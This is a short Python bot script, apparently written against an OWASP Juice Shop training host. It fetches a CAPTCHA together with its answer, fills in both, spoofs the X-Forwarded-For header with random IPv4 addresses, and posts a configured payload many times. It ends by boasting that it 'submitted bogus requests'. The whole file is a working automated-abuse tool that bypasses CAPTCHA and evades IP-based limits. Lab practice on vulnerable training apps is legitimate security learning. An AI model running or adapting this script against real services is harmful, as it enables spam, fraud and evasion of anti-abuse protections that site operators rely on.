import requests
import json
from faker import Faker

config = json.loads(open('./config.json').read())

faker = Faker()

print('Starting...')

def send_request_to_url(config, headers = {}, i=0):
    headers['Content-Type'] = 'application/json'
    headers['X-Forwarded-For'] = faker.ipv4()

    captchaResponse = requests.get(url = 'http://juice.f5trn.com/rest/captcha/', headers=headers, json=config['payload'])

    config['payload']['captchaId'] = captchaResponse.json().get('captchaId')
    config['payload']['captcha'] = captchaResponse.json().get('answer')

    response = requests.post(url = config['url'], headers=headers, json=config['payload'])

    print(json.dumps(config['payload']))

max = config['timesToSend']

for i in range(0,max):
    send_request_to_url(config, {}, i)

print('This bot submitted ' + str(max) + ' bogus requests!--------------')
# end
